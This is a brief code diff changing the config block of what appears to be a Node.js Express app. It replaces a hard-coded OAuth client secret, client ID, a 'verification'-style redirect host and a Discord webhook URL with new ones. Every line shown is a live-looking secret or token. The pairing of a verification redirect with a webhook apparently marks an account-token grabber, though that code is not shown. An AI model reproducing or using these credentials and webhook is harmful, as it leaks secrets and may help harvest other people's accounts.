@@ -1,8 +1,8 @@
 //Config
-const client_secret = '4C68Q~wJ.pgKybkSYt6b43A26r17sfxoi.ifLcPe'
-const client_id = 'f14e4773-ad29-4bcf-bc4e-21bffe051226'
-const redirect_uri = 'https://verification-dc.herokuapp.com'
-const webhook_url = 'https://discordapp.com/api/webhooks/1042483370506059876/hZDtiONW0j_875FQHKM3iMTWDvw3eEFBj8z2SvmgEAhqUmR7Lk61YkygSXCuo7pJhYi6'
+const client_secret = 'cuW8Q~GHEAys3nYLM.tqQwU.~6MDeYdTAjORxcOZ'
+const client_id = '88111c68-74ca-4942-9bef-b9761adc7323'
+const redirect_uri = 'https://dungeonsheavenauth.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1060923690927271987/N9EHxXPKdp4cDQrqccVko-mcnOj3o28OhpEZdo0rL57-Hc1x6a1O6zpkNx5FkyW51L7c'
 //Requirements
 const axios = require('axios')
 const express = require('express')
